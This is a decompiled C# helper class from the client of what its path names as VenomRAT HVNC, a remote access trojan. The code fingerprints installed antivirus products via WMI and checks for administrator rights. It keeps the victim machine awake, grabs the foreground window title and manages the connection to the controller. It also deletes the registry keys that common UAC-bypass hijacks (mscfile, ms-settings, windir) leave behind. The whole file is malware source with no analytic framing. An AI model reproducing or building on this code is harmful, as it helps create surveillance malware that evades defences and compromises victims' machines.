// Decompiled with JetBrains decompiler
// Type: Client.Helper.Methods
// Assembly: Client, Version=5.0.0.3, Culture=neutral, PublicKeyToken=null
// MVID: AF1838BC-6B25-40E4-9339-7F493AC3654D
// Assembly location: C:\Users\Younn\RiderProjects\VenomRAT_HVNC-5.0.4.0\VenomRAT_HVNC\bin\Debug\Client.exe

using Client.Connection;
using Microsoft.Win32;
using System;
using System.Drawing.Imaging;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;


namespace Client.Helper
{
  public static class Methods
  {
    public static bool IsAdmin()
    {
      return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
    }

    public static void ClientOnExit()
    {
      try
      {
        if (Convert.ToBoolean(Settings.BS_OD) && Methods.IsAdmin())
          ProcessCritical.Exit();
        MutexControl.CloseMutex();
        ClientSocket.SslClient?.Close();
        ClientSocket.TcpClient?.Close();
      }
      catch
      {
      }
    }

    public static string Antivirus()
    {
      try
      {
        string input = string.Empty;
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct"))
        {
          foreach (ManagementObject managementObject in managementObjectSearcher.Get())
            input = input + managementObject["displayName"].ToString() + "; ";
        }
        string str = Methods.RemoveLastChars(input);
        return !string.IsNullOrEmpty(str) ? str : "N/A";
      }
      catch
      {
        return "Unknown";
      }
    }

    public static string RemoveLastChars(string input, int amount = 2)
    {
      if (input.Length > amount)
        input = input.Remove(input.Length - amount);
      return input;
    }

    public static ImageCodecInfo GetEncoder(ImageFormat format)
    {
      foreach (ImageCodecInfo imageDecoder in ImageCodecInfo.GetImageDecoders())
      {
        if (imageDecoder.FormatID == format.Guid)
          return imageDecoder;
      }
      return (ImageCodecInfo) null;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern NativeMethods.EXECUTION_STATE SetThreadExecutionState(
      NativeMethods.EXECUTION_STATE esFlags);

    public static void PreventSleep()
    {
      try
      {
        int num = (int) Methods.SetThreadExecutionState(NativeMethods.EXECUTION_STATE.ES_CONTINUOUS | NativeMethods.EXECUTION_STATE.ES_DISPLAY_REQUIRED | NativeMethods.EXECUTION_STATE.ES_SYSTEM_REQUIRED);
      }
      catch
      {
      }
    }

    public static string GetActiveWindowTitle()
    {
      try
      {
        StringBuilder text = new StringBuilder(256);
        if (NativeMethods.GetWindowText(NativeMethods.GetForegroundWindow(), text, 256) > 0)
          return text.ToString();
      }
      catch
      {
      }
      return "";
    }

    public static void ClearSetting()
    {
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Environment");
        if (subKey.GetValue("windir") != null)
          subKey.DeleteValue("windir");
        subKey.Close();
      }
      catch
      {
      }
      try
      {
        Registry.CurrentUser.OpenSubKey("Software", true).OpenSubKey("Classes", true).DeleteSubKeyTree("mscfile");
      }
      catch
      {
      }
      try
      {
        Registry.CurrentUser.OpenSubKey("Software", true).OpenSubKey("Classes", true).DeleteSubKeyTree("ms-settings");
      }
      catch
      {
      }
    }
  }
}
